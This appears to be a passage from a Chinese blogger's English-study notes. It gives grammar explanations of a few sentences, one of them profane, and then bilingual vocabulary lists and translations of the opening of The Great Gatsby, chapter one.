 If i could如果我可以
 I would 那么我愿意
 but i can&#39;t但是我不能
 so i shan&#39;t所以我不会
 （shan’t是shall的否定式）
</code></pre>
</li>
<li><pre><code> They don&#39;t know that we know they know we know.
 
 They don&#39;t know &#123;that we know [they know (we know)].&#125;
 
 三层宾语从句，
 这就是英语句子“形合”的特征：
 句子能清晰地表达逻辑关系。
 “他们不知道我们知道他们知道我们知道”
</code></pre>
</li>
<li><pre><code> Fuck you fucking fucker! 
 
 fucking fucker是you的同位语，
 fucking是形容词，
 修饰后面的fucker。
</code></pre>
</li>
</ol>
<h2 id="The-Great-Gatsby"><a href="#The-Great-Gatsby" class="headerlink" title="The Great Gatsby"></a>The Great Gatsby</h2><p>###Chapter one</p>
<pre><code>vulnerable 脆弱的
reserved  矜持的
In consequence 因此
inclined 倾向于
veteran bores向来无聊的人
detect 发觉
privy  知情的
griefs  悲痛
feigned 虚假的
Preoccupation 心事重重
levity 轻率
intimate  直接的
quivering  颤抖的
plagiaristic  剽窃的
suppressions 压抑
unmistakable  毋庸置疑的
snobbishly  自命不凡的
fundamental  基本的
decency 道德规范  
</code></pre>
<hr>
<p>In my younger and more vulnerable years my father gave me some advice that I’ve been turning over in my mind ever since. 在我年轻而脆弱的岁月里，父亲给了我一些我一直以来都在思考的建议.。</p>
<hr>
<p>“Whenever you feel like criticizing anyone,” he told me,”just remember that all the people in this world haven’t had the advantages that you’ve had.” “每当你想批评任何人的时候，”他告诉我，“要记得，世界上所有的人并非皆禀有你所拥有的条件。”</p>
<hr>
<p>He didn’t say any more, but we’ve always been unusually communicative in a reserved way, and I understood that he meant a great deal more than that. 他没有再说什么，但我们一直异乎寻常地以矜持的方式交流，我知道他所想要表达的远不止如此。</p>
<hr>
<p>In consequence, I’m inclined to reserve all judgments, a habit that has opened up many curious natures to me and also made me the victim of not a few veteran bores. 因此，我倾向于保留所有的判断，这种习惯是我认识了许多稀奇古怪的人，也让我不幸的成为了他们的倾诉对象。</p>
<hr>
<p>The abnormal mind is quick to detect and attach itself to this quality when it appears in a normal person, and so it came about that in college I was unjustly accused of being a politician, because I was privy to the secret griefs of wild, unknown men. 这个特点在正常的人身上出现的时候，心理不正常的人很快就会察觉并且抓住不放。由于这个缘故，我上大学的时候就被不公正地指责为小政客，因为我与闻一些放荡的、不知名的人的秘密的伤心事。</p>
<hr>
<p>Most of the confidences were unsought-frequently I have feigned sleep, preoccupation, or a hostile levity when I realized by some unmistakable sign that an intimate revelation was quivering on the horizon; for the intimate revelations of young men, or at least the terms in which they express them, are usually plagiaristic and marred by obvious suppressions. 多数情况下，我并不想获悉他们的隐私———每每见势不对，觉察到有人要拿我当知己，迫不及待地准备向我倾吐心思，我就常装睡觉，或托词忙碌，或故意不表同情，说几句开人家玩笑的话；因为据我的经验，青年人拿你当作知己所倾吐的知心话往往是千篇一律，而且坏在并不诚实，很少和盘托出。</p>
<hr>
<p>Reserving judgments is a matter of infinite hope. 保留判断表示怀有无限的希望。</p>
<hr>
<p>I am still a little afarid of missing something if forget that, as my father snobbishly suggested, and I snobbishly repeat, a sense of the fundamental decencies is parceled out unequally at birth. 我还是有点害怕如果忘了而错过什么东西，我的父亲自命不凡地建议，我自命不凡地重复，人们的善恶感一生下来就有差异。</p>
<hr>
<pre><code>admission 承认
Conduct 行为
Marshes 沼泽
riotous excursions 肆意妄为
glimpse into the human heart 深入人心的一瞥
Privilege 给与特权
把看到人心的一瞥当成荣幸
Scorn 轻蔑
gorgeous  华丽的
heightened  使变高
sensitivity 敏感
responsiveness  响应
flabby  肥肉下垂
impressionability  可印性
dignified  庄严的
Temperament 性格
extraordinary  非凡的
descend 降临；传承
</code></pre>
<hr>
<p>And, after boasting this way of my tolerance, I come to the admission that it has a limit. 如此吹嘘过自己的宽容之后，我得承认，这宽容也有限度。</p>
<hr>
<p>Conduct may be founded on the hard rock or the wet marshes, but after a certain point I do not care what it is founded on. 行为可建立在坚硬的磐石上，亦可以建立在湿软的沼泽上。然则，若超过了一定限度，我才不在乎它到底建立上什么上面呢。</p>
<hr>
<p>When I came back from the East last autumn I felt that I wanted the world to be in uniform and at a sort of moral attention forever; I wanted no more riotous excursions with privileged glimpses into the human heart. 去年秋天，当我从东部回来的时候，我感觉我希望全世界的人都穿上军装，在道德方面来个立正；我不想再肆意妄为地到处游荡、以打探别人的隐私为荣。</p>
<hr>
<p>Only Gatsby, who represented everything for which I have an unaffected scorn. 除了本书的同名人物盖茨比，那个代表了我发自内心鄙夷的一切事物的男人。</p>
<hr>
<p>If personality is an unbroken series of successful gestures, then there was something gorgeous about him, some heightened sensitivity to the promises of life, as if he were related to one of those intricate machines that register earthquakes ten thousand miles away. 如果说个性是一系列连续不断的成功姿态，那么他身上确有某种不同凡响的东西，某种对人生中显露的各种可能性的高度的敏感，仿佛他和某个可以监测到一万英里开外的地震的精密仪器联接着。</p>
<hr>
<p>This responsiveness had nothing to do with that flabby impressionability which is dignified under the name of the “creative temperament”–it was an extraordinary gift for hope, a romantic readiness such as I have never found in any other person and which it is not likely I shall ever find again. 此种响应能力和那种通常美其名曰“创造性气质”的松垮的易感性毫不相干。它不啻一份上帝的礼物，让受礼者内心永葆希望，永远处于一种颇具浪漫色彩的蓄势待发的状态。如此敏捷的反应能力我过去从未在任何其他人身上发现过，而将来也不可能再找到。</p>
<hr>
<p>No–Gastby turned out all right at the end; it is what preyed on Gastby, what foul dust floated in the wake of his dreams that temporily closed out my interest in the abortive sorrows and short-winded elations of men. 不——盖茨比本人到头来倒是无可厚非的、使我对人们短暂的悲哀和片刻的欢欣暂时丧失兴趣的，却是那些吞噬盖茨比心灵的东西，是在他的幻梦消逝后跟踪而来的恶浊的灰尘。</p>
<hr>
<p>My family have been prominent, well-to-do people in this Middle Western city for three generations. 我的家族在这个中西部城市声名显赫，殷实富足，已有三代。</p>
<hr>
<p>The Carraways are something of a clan, and we have a tradition that we are descend from the Dukes of Buccleuch, but the actual founder of my line was my grandfather’s brother, who came here in fifty-one, sent a business that my father carries on today. 卡拉韦不过是氏族的代号，我们有着巴克鲁伯爵所遗留的传统，但是真正的奠基家族线的是我外祖父的兄弟，他五十一岁来到这里，送给了我父亲运营至今的生意。</p>
<hr>
<p>I never saw this great-uncle, but I am supposed to look like him–with<br>special reference to the rather hard-boiled painting that hangs in father’s office. 我从未见过这位伯祖父，但是据说我长得像他，特别有挂在父亲办公室里的那幅铁板面孔的画像为证。</p>
<hr>
<p>I graduated from New Haven in 1915, just a quarter of a century after my father, and a little later I participated in that delayed Teutonic migration known as the Great War. 在我父亲毕业于耶鲁大学25年之后，我也于1915年毕业于此，然而不久以后就参加了那场由条顿民族移民他国而引致的世界大战。</p>
<hr>
<p>I enjoyed the counter raid so thoroughly that I came back restless. 我在反攻战中感到其乐无穷，以至于回来后感觉百无聊赖了。</p>
<hr>
<p>Instead of being the warm center of the world, the Middle West now seemed like the ragged edge of the universe–so I decided to go East and learn the bond business. 中西部不再是世界温暖的中心，而倒像是宇宙的荒凉的边缘——于是我决定到东部去学债券生意。</p>
<hr>
<p>Everybody I knew was in the bond business ,so I supposed it could support one more single man. All my aunts and uncles talked it over as if they were choosing a prep school for me, and finally said, “Why–ye–es,” with very grave, hesitant faces. Father agreed to finance me for a year, and after various delays I came East, permanently, I thought, in the spring of twenty-two. 我所认识的人个个都是做债券生意的， 因此我认为它多养活一个单身汉总不成问题。我的叔伯姑姨们商量了一番，他们怦然是在为我挑选一家预备学校，最后才说：“呃……那就……这样吧。”面容都很严肃而 犹疑。父亲答应为我提供一年的费用，然后又几经耽搁我才在一九二二年春天到东部去，<br>自以为是一去不返的了。</p>
<hr>
<p>The practical thing was to find rooms in the city, but it was a warm season, and I had just left a country of wide lawns and friendly trees, so when a young man at the office suggested that we take a house together in a communicating town, it sound like a great idea. 切合实际的办法是在城里找一套房寄宿，但那时已是温暖的季节，而我又是刚刚离开了一个有宽阔的草坪和宜人的树木的地方，因此办公室里一个年轻人提议我们俩到近郊合租一所房子的时候，我觉得那是个很妙的主意。</p>
<hr>
<p>He found the house, a weather-beaten cardboard bungalow at eighty a month, but at last minute the firm ordered him, to Washington, and I went out to the country alone. I had a dog–at least I had him for a few days until he ran away–and an old Dodge and a Finish woman, who made my bed and cooked breakfast and muttered Finish wisdom to herself over the electric stove. 他找到了房子，那是一座风雨剥蚀的木板平房，月租八十美元，可是在最后一分钟公司把他调到华盛顿去了，我也就只好一个人搬到郊外去住。我有一条狗——至少在它跑掉以前我养了它几天——一辆旧道吉汽车和一个芬兰女佣人，她替我收拾床铺，烧早饭，在电炉上一面做饭，一面嘴里咕哝着芬兰的格言。</p>
<hr>
<p>It was lonely for a day or so until one morning some man, more recently arrived than I, stopped me on the road. 头几天我感到孤单，直到一天早上有个人，比我更是新来乍到的，在路上拦住了我。</p>
<hr>
<p>“How do you get to West Egg village?” he asked helplessly. “到西卵村去怎么走啊？”他无可奈何地问我。</p>
<hr>
<p>I told him. And as I walked on I was lonely no longer. I was a guide, a pathfinder, an original setter. He had casually conferred on me the freedom of the neighborhood. 我告诉了他。我再继续往前走的时候，我不再感到孤单了。我成了领路人、开拓者、 一个原始的移民。他无意之中授予了我这一带地方的荣誉市民权。</p>
<hr>
<p>And so with the sunshine and the great bursts of leaves growing on the trees, just as things grow in fast movies, I had that familiar conviction that life was beginning over again with the summer. 眼看阳光明媚，树木忽然间长满了叶子，就像电影里的东西长得那么快，我就又产生了那个熟悉的信念，觉得生命随着夏天的来临又重新开始了。</p>
<hr>
<pre><code>Mint 铸币厂
①迈达斯（Midas），希腊神话中的国王，曾求神赐予点金术。
②摩根（Morgan），美国财阀。
③米赛纳斯（maecenas），古罗马大财主。
solemn  正经
obvious 平淡无奇
epigram 讽刺诗
slender细长
Riotous 奇形怪状
barnyard  仓院
perpetual  不断地
gulls  海鸥
dissimilarity  不同点
</code></pre>
<hr>
<p>There was so much to read, for one thing, and so much fine health to be pulled down out of the young breath-giving air. 有那么多书要读，这是一点，同时从清新宜人的空气中也有那么多营养要汲取。</p>
<hr>
<p>I bought a dozen volumes on banking and credit and investment securities, and they stood on my shelf in red and gold like new money from the mint, promising to unfold the shining secrets that only Midas and Morgan and Maecenas knew. 我买了十来本有关银行业、信贷和投资证券的书籍，一本本红色烫金封皮的书立在书架上，好像造币厂新铸的钱币一样，准备揭示迈达斯、摩根和米赛纳斯的秘诀。</p>
<hr>
<p>And I had the high intention of reading many other books besides.<br>I was rather literary in college–one year I wrote a series of very solemn and obvious editors for the Yale News–and now I was going to bring back all such things into my life and become again that most limited of all specialists, the “well-rounded man”. 除此之外，我还有雄心要读许多别的书。我在大学的时候是喜欢舞文弄墨的——有一年我给《耶鲁新闻》写过一连串一本正经而又平淡无奇的社论——现在我准备把诸如此类的东西重新纳入我的生活，重新成为“通才”，也就是那种最浅薄的专家。</p>
<hr>
<p>This is not just an epigram–life is much more successfully looked at from a single window, after all. 这并不只是一个俏皮的警句——光从一个窗口去观察人生究竟要成功得多。</p>
<hr>
<p>It was a matter of chance that I should have rented a house in one of the strangest communities in North America. It was that slender riotous island which extends itself due east of New York–and where there are, miles from the city a pair of enormous, two unusual formations of land. Twenty miles from the city a pair of enormous eggs, identical in contour and separated only by a contour and separated only by a courtesy bay, just out into the most domesticated body of salt water in the Western hemisphere, the great wet barnyard of Long Island Sound. 纯粹出于偶然，我租的这所房子在北美最离奇的一个村镇。这个村镇位于纽约市正东那个细长的奇形怪状的小岛上——那里除了其他天然奇观以外，还有两个地方形状异乎寻常。离城二十英里路，有一对其大无比的鸡蛋般的半岛，外形一模一样，中间隔着一条小湾，一直伸进西半球那片最恬静的咸水，长岛海峡那个巨大的潮湿的场院。</p>
<hr>
<p>They are not perfect ovals–like the egg in the Columbus story, they are both crushed flat at the contact end–but their physical resemblance must be a source of perpetual wonder to the gulls that fly overhead. 它们并不是正椭圆形——而是像哥伦布故事里的鸡蛋一样，在碰过的那头都是压碎了的——但是它们外貌的相似一定是使从头上飞过的海鸥惊异不已的源泉。</p>
<hr>
<p>To the wingless a more interesting phenomenon is their dissimilarity in every particular except shape and size. 对于没有翅膀的人类来说，一个更加饶有趣味的现象，却是这两个地方除了形状大小之外，在每一个方面都截然不同。</p>
<hr>
<pre><code>superficial  肤浅的
bizarre 离奇的
sinister 凶兆的
yards 码，等于3英寸36英尺或0.9144米
squeeze 挤压
colossal 巨大的
affair 事务，风流韵事
factual 事实
imitation 仿制品
marble 大理石
acres 英亩
lawn 草坪
mansion 大厦
inhabited 有人居住的
eyesore 难看的东西
partial 部分的
proximity 亲近距离
</code></pre>
<hr>
<p>I lived at the West Egg,the-well,the less fashionable of the two,though this is a most superficial tag to express the bizarre and not a little sinister contrast between them. 我住在西卵，这是两个地方中比较不那么时髦的一个，不过这是一个非常肤浅的标签，不足以表示二者之间那种离奇古怪而又很不吉祥的对比。</p>
<hr>
<p>My house was at the very tap of the egg, only fifty yards from the Sound, and squeezed between two huge places that rented for twelve or fifteen thousand a season. 我的房子紧靠在鸡蛋的顶端，离海湾只有五十码，挤在两座每季租金要一万二到一万五的大别墅中间。</p>
<hr>
<p>The one on my right was a colossal affair by any standard-it was a factual imitation of some Hotel de Ville in Normandy, with a tower on one side, spanking new under a thin beard of raw ivy, and a marble swimming pool, and more than forty acres of lawn and garden. 我右边的那一幢，不管按什么标准来说，都是一个庞然大物——它是诺曼底①某市政厅的翻版，一边有一座簇新的塔楼，上面疏疏落落地覆盖着一层常春藤，还有一座大理石游泳池，以及四十多英亩的草坪和花园。</p>
<hr>
<p>It was Gatsby’s mansion. or, ranther, as I didn’t know Mr.Gatsby, it was a mansion, inhabited by a gentleman of that name. 这是盖茨比的公馆。或者更确切地说这是一位姓盖茨比的阔人所住的公馆，因为我还不认识盖茨比先生。</p>
<hr>
<p>My own house was an eyesore, but it was a small eyesore, and it had been overlooked, so I had a view of the water, a partial vivew of my neighbor’s lawn, and the consoling proximitly of millionaires-all for eighty dollars a month.</p>
<p>我自己的房子实在难看，幸而很小，没有被人注意，因此我才有缘欣赏一片海景，欣赏我邻居草坪的一部分，并且能以与百万富翁为邻而引以自慰——所有这一切每月只需出八十美元。</p>
]]></content>
      <categories>
        <category>Story</category>
      </categories>
      <tags>
        <tag>Story</tag>
      </tags>
  </entry>
</search>
